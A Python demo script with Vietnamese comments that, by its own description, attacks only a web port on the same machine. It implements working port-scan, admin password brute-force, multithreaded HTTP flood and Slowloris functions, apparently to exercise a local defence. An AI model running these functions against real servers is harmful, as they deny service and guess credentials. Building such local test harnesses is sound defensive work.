"""Kịch bản tấn công của demo, CHỈ nhắm vào cổng web trên chính máy này.

Nguồn tấn công là IP mạng LAN của máy, để phân biệt với người dùng bình thường ở 127.0.0.1.
Dùng: python3 demo/attack.py scan | brute | flood | slow
"""
import socket
import sys
import threading
import time
import urllib.parse


def own_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("10.255.255.255", 1))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.2"      # không có mạng: chạy trước sudo ifconfig lo0 alias 127.0.0.2
    finally:
        s.close()


HOST, PORT = own_ip(), 8080


def conn(port=PORT, timeout=2):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((HOST, port))
    return s


def http(data):
    s = conn()
    s.sendall(data)
    try:
        while s.recv(65536):
            pass
    except OSError:
        pass
    s.close()


def scan():
    """Quét cổng: chạm lần lượt các cổng để tìm dịch vụ đang mở."""
    found = []
    for p in range(1, 10001):
        try:
            conn(p, 0.05).close()
            found.append(p)
        except OSError:
            pass
    print("cổng mở:", found)


def brute():
    """Dò mật khẩu: thử liên tiếp mật khẩu cho tài khoản admin."""
    for i in range(300):
        body = urllib.parse.urlencode({"username": "admin", "password": f"matkhau{i}"}).encode()
        req = (f"POST /auth/login HTTP/1.1\r\nHost: {HOST}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
        try:
            http(req)
        except OSError:
            print("bị từ chối ở lần thử", i)
            return
        print("thử mật khẩu", i, end="\r")
        time.sleep(0.05)
    print("đã thử 300 mật khẩu")


def flood():
    """Làm ngập: nhiều luồng gửi yêu cầu liên tục trong 40 giây."""
    stop = time.time() + 40
    count = [0, 0]

    def worker():
        while time.time() < stop:
            try:
                http(f"GET / HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
                count[0] += 1
            except OSError:
                count[1] += 1
                time.sleep(0.05)
    ts = [threading.Thread(target=worker) for _ in range(20)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    print("thành công", count[0], "bị từ chối", count[1])


def slow():
    """Slowloris: mở nhiều kết nối, gửi header thật chậm để giữ tài nguyên máy chủ."""
    socks = []
    for _ in range(100):
        try:
            s = conn()
            s.sendall(f"GET / HTTP/1.1\r\nHost: {HOST}\r\n".encode())
            socks.append(s)
        except OSError:
            pass
    print("đang giữ", len(socks), "kết nối")
    for _ in range(12):
        time.sleep(5)
        for s in list(socks):
            try:
                s.sendall(b"X-a: b\r\n")
            except OSError:
                socks.remove(s)
        print("còn", len(socks), "kết nối")


if __name__ == "__main__":
    print("tấn công từ", HOST, "vào cổng", PORT)
    {"scan": scan, "brute": brute, "flood": flood, "slow": slow}[sys.argv[1]]()
